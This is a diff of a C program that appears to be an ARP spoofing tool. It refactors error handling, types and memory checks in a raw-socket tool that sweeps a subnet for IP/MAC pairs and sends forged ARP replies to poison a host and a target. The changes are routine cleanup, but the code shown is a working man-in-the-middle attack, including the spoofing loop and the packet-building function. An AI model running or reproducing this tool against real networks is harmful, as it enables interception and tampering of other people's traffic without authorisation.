@@ -31,28 +31,26 @@ struct ip_mac {
 
 void print_usage(char *);
 void destroy_pairs(struct ip_mac *);
-void mac_to_str(char *, uint8_t [ETH_ALEN]);
-struct ip_mac *ip_sweep(int, int, uint8_t [IP_ALEN],
-                                  uint8_t [ETH_ALEN]);
+void mac_to_str(char *, uint8_t[]);
+struct ip_mac *ip_sweep(int, int, uint8_t[],
+                                  uint8_t[]);
 int is_valid_ip(char *);
-int recv_arp(int, char *, unsigned short int, uint8_t [4]);
-int get_if_info(int, char [IFNAMSIZ], 
-                     struct ifreq *,
-                     struct ifreq *,
-                     struct ifreq *);
-int send_arp(int, int, unsigned char *, 
-                       unsigned char *, 
-                       unsigned char *, 
-                       unsigned char *, 
-                       uint8_t [4], 
-                       uint8_t [4], 
+int get_if_info(int, char[], struct ifreq *,
+                             struct ifreq *,
+                             struct ifreq *);
+int send_arp(int, int, uint8_t[], 
+                       uint8_t[], 
+                       uint8_t[], 
+                       uint8_t[], 
+                       uint8_t[], 
+                       uint8_t[], 
                        unsigned short int);
 
 uint8_t broadcast[] = "\xff\xff\xff\xff\xff\xff";
 uint8_t empty[]     = "\x00\x00\x00\x00\x00\x00";
 
 
-int main(int argc, char *argv[]) {
+int main(int argc, char **argv) {
     char dev[IFNAMSIZ];
     char our_m_str[MACSLEN], target_m_str[MACSLEN], host_m_str[MACSLEN];
     char our_ip_str[IPSLEN], host_str[IPSLEN]; 
@@ -64,10 +62,10 @@ int main(int argc, char *argv[]) {
     // create raw socket
     if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
         if (getuid() != 0) {
-            printf("Run again as sudo! (sudo %s)\n", argv[0]);
-            exit(0);
+            fprintf(stderr, "Run again as sudo! (sudo %s)\n", argv[0]);
+            exit(1);
         }
-        err(1, "Error : raw sock create failed\n");
+        err(1, "Error : raw sock create failed");
     }
 
     // set defaults
@@ -85,7 +83,8 @@ int main(int argc, char *argv[]) {
                 dev_from_arg = 1;
 
                 if (strlen(optarg) > IFNAMSIZ) {
-                    err(1, "Error : Interface name %s too long (try renaming it)\n", optarg);
+                    fprintf(stderr, "Error : Interface name %s too long (try renaming it)\n", optarg);
+                    exit(1);
                 }
                 strncpy(dev, optarg, IFNAMSIZ);
                 dev[strlen(optarg)] = 0;
@@ -94,7 +93,8 @@ int main(int argc, char *argv[]) {
             case 'h':
                 // host sufix option
                 if ((sufix = atoi(optarg)) > 254) {
-                    err(1, "Error : host sufix %d to high (over 254)\n", sufix);
+                    fprintf(stderr, "Error : host sufix %d too high (over 254)\n", sufix);
+                    exit(1);
                 }
                 break;
 
@@ -116,15 +116,17 @@ int main(int argc, char *argv[]) {
 
         // get default interface
         if (pcap_findalldevs(&devs, errbuf) == FAIL) {
-            err(1, "Error : could not default interface, please enter one %s\n", errbuf);
+            err(1, "Error : could not default interface, please enter one");
         }
         if (devs == NULL) {
-            err(1, "Error : could not default interface, please enter one\n");
+            fprintf(stderr, "Error : could not default interface, please enter one (with option -i)\n");
+            exit(1);
         }
         int len = strlen(devs->name);
 
         if (len > IFNAMSIZ) {
-            err(1, "Default interface name %s too long (try renaming it)\n", devs->name);
+            fprintf(stderr, "Error : Default interface name %s too long (try renaming it)\n", devs->name);
+            exit(1);
         }
         strncpy(dev, devs->name, IFNAMSIZ);
         dev[len] = 0;
@@ -132,11 +134,11 @@ int main(int argc, char *argv[]) {
 
     // get interface info
     if(get_if_info(sock, dev, &ifreq_i, &ifreq_c, &ifreq_ip) == FAIL) {
-        err(1, "Error : Failed to get info for interface %s (you probably chose the worng one, try ifconfig or google)\n", dev);
+        err(1, "Error : Failed to get info for interface %s (you probably chose the wrong one, try ifconfig or google)", dev);
     }
 
     // save interface info 
-    memcpy(our_mac, (unsigned char *)(ifreq_c.ifr_hwaddr.sa_data), ETH_ALEN);
+    memcpy(our_mac, (uint8_t *)(ifreq_c.ifr_hwaddr.sa_data), ETH_ALEN);
     mac_to_str(our_m_str, our_mac); 
     memcpy(our_ip, (void *)&(((struct sockaddr_in *)&(ifreq_ip.ifr_addr))->sin_addr), IP_ALEN);
     sprintf(our_ip_str, "%d.%d.%d.%d\n", 
@@ -155,7 +157,7 @@ int main(int argc, char *argv[]) {
             host_ip[3]);
 
     if (!is_valid_ip(host_str)) {
-        err(1, "Error %s is not a vaild ip address\n", host_str);
+        err(1, "Error %s is not a vaild ip address", host_str);
     }
 
     // scan network for targets 
@@ -181,7 +183,8 @@ int main(int argc, char *argv[]) {
         }            
         if (p->next == NULL) {
             destroy_pairs(ip_mac_pairs);
-            err(1, "Could not get host %s MAC\n", host_str);
+            fprintf(stderr, "Could not get host %s MAC\n", host_str);
+            exit(1);
         }
         prv = p;
         p   = p->next;
@@ -210,8 +213,8 @@ int main(int argc, char *argv[]) {
                     host_mac,     // eth dest mac
                     our_mac,      // arp source mac
                     host_mac,     // arp target mac
-                    target_ip,    // source ip
-                    host_ip,      // target ip
+                    target_ip,    // arp source ip
+                    host_ip,      // arp target ip
                     ARPOP_REPLY); // opcode
 
             sleep(1);
@@ -235,8 +238,8 @@ int main(int argc, char *argv[]) {
                     target_mac,   // eth dest mac
                     our_mac,      // arp source mac
                     target_mac,   // arp target mac
-                    host_ip,      // source ip 
-                    target_ip,    // target ip
+                    host_ip,      // arp source ip 
+                    target_ip,    // arp target ip
                     ARPOP_REPLY); // opcode 
 
 
@@ -252,23 +255,8 @@ int main(int argc, char *argv[]) {
 }
 
 void print_usage(char *pname) {
-    err(1, "Usage: (sudo) %s [interface] [-h host-sufix (default 1)] [-n num-packets (default 20)]\n", pname);
-}
-
-int recv_arp(int sock, char *buf, unsigned short op_code, uint8_t s_ip[IP_ALEN]) {
-    int bytes_recvd;
-
-    while (1) {
-        bytes_recvd = read(sock, buf, ARPSIZ);
-
-        if (ntohs(((struct ethhdr*)(buf))->h_proto) == 0x0806) {
-            struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ethhdr));
-
-            if (ntohs(arp->ea_hdr.ar_op) == op_code && memcmp(arp->arp_spa, s_ip, 4) == 0) {
-                return bytes_recvd;
-            }
-        }
-    }
+    fprintf(stderr, "Usage: (sudo) %s [-i interface] [-h host-sufix (default 1)] [-n num-packets (default 20)]\n", pname);
+    exit(1);
 }
 
 void destroy_pairs(struct ip_mac *head) {
@@ -281,7 +269,11 @@ void destroy_pairs(struct ip_mac *head) {
 
 struct ip_mac *add_ip_mac(struct ip_mac *head, uint8_t ip[IP_ALEN],
                                                uint8_t mac[ETH_ALEN]) {
-    struct ip_mac *new = malloc(sizeof(struct ip_mac));
+    struct ip_mac *new;
+
+    if (!(new = malloc(sizeof(struct ip_mac)))) {
+        err(1, "Error : malloc struct in %s == NULL", __FUNCTION__);
+    }
 
     memcpy(new->ip, ip, IP_ALEN);
     memcpy(new->mac, mac, ETH_ALEN);
@@ -319,9 +311,9 @@ struct ip_mac *ip_sweep(int sock, int if_idx, uint8_t s_ip[IP_ALEN],
     time_t start       = time(NULL);
     time_t seconds     = STIMEOUT;
 
-    unsigned char *buf;
+    uint8_t *buf;
     if (!(buf = malloc(ARPSIZ))) {
-        err(1, "Error : malloc buf in %s == NULL\n", __FUNCTION__);
+        err(1, "Error : malloc buf in %s == NULL", __FUNCTION__);
     }
 
     endwait = start + seconds;
@@ -333,7 +325,7 @@ struct ip_mac *ip_sweep(int sock, int if_idx, uint8_t s_ip[IP_ALEN],
 
         if ((read(sock, buf, ARPSIZ)) < 0) {
             destroy_pairs(ip_mac_pairs);
-            err(1, "Error : sock read failed\n");
+            err(1, "Error : sock read failed");
         }
 
         if (ntohs(((struct ethhdr*)(buf))->h_proto) == ETH_P_ARP) {
@@ -375,7 +367,7 @@ int get_if_info(int sock, char dev[IFNAMSIZ], struct ifreq *ifreq_i,
     strncpy(ifreq_i->ifr_name, dev, IFNAMSIZ-1);
    
     if ((ioctl(sock, SIOCGIFINDEX, ifreq_i)) == FAIL) {
-        err(1, "Error : %s ioctl index read failed\n", dev);
+        fprintf(stderr, "Error : %s ioctl index read failed\n", dev);
         return FAIL;
     }
 
@@ -384,7 +376,7 @@ int get_if_info(int sock, char dev[IFNAMSIZ], struct ifreq *ifreq_i,
     strncpy(ifreq_c->ifr_name, dev, IFNAMSIZ-1);
 
     if ((ioctl(sock, SIOCGIFHWADDR, ifreq_c)) == FAIL) {
-        err(1, "Error : ioctl MAC read failed\n");
+        fprintf(stderr, "Error : %s ioctl MAC read failed\n", dev);
         return FAIL;
     }
 
@@ -393,7 +385,7 @@ int get_if_info(int sock, char dev[IFNAMSIZ], struct ifreq *ifreq_i,
     strncpy(ifreq_ip->ifr_name, dev, IFNAMSIZ-1);
 
     if(ioctl(sock, SIOCGIFADDR, ifreq_ip) == FAIL) {
-        err(1, "Error : ioctl IP read failed\n");
+        fprintf(stderr, "Error : %s ioctl IP read failed\n", dev);
         return FAIL;
     }
     return 0;
@@ -409,14 +401,18 @@ int send_arp(int sock, int if_idx, uint8_t s_mac[ETH_ALEN],
                                    uint8_t d_mac[ETH_ALEN], 
                                    uint8_t arp_s_mac[ETH_ALEN], 
                                    uint8_t arp_t_mac[ETH_ALEN], 
-                                   uint8_t arp_s_ip[4], 
-                                   uint8_t arp_t_ip[4], 
+                                   uint8_t arp_s_ip[IP_ALEN], 
+                                   uint8_t arp_t_ip[IP_ALEN], 
                                    unsigned short int opcode) {
     int send_len;
-    unsigned char *sendbuff = malloc(ARPSIZ);
+    uint8_t *sendbuf;
+
+    if (!(sendbuf = malloc(ARPSIZ))) {
+        err(1, "malloc buf in %s == NULL", __FUNCTION__);
+    }
 
     // cast packet start to ethernet header
-    struct ethhdr *eth = (struct ethhdr *)(sendbuff);
+    struct ethhdr *eth = (struct ethhdr *)(sendbuf);
 
     // add interface/dest MAC and protocol
     memcpy(eth->h_source, s_mac, ETH_ALEN);
@@ -424,7 +420,7 @@ int send_arp(int sock, int if_idx, uint8_t s_mac[ETH_ALEN],
     eth->h_proto = htons(ETH_P_ARP);
 
     // cast next section to ARP header 
-    struct ether_arp *arp = (struct ether_arp *)(sendbuff + sizeof(struct ether_header));
+    struct ether_arp *arp = (struct ether_arp *)(sendbuf + sizeof(struct ether_header));
      
     // add ARP source/target MAC
     memcpy(arp->arp_sha, arp_s_mac, ETH_ALEN);
@@ -450,8 +446,8 @@ int send_arp(int sock, int if_idx, uint8_t s_mac[ETH_ALEN],
     memcpy(sadr_ll.sll_addr, d_mac, ETH_ALEN);
 
     // send
-    if ((send_len = sendto(sock, sendbuff, ARPSIZ, 0, (const struct sockaddr*)&sadr_ll, sizeof(struct sockaddr_ll))) < 0) {
-        err(1, "Error : sending failed :(\n");
+    if ((send_len = sendto(sock, sendbuf, ARPSIZ, 0, (const struct sockaddr*)&sadr_ll, sizeof(struct sockaddr_ll))) < 0) {
+        fprintf(stderr, "Error : sending ARP failed\n");
         return FAIL;
     }
     return 0;
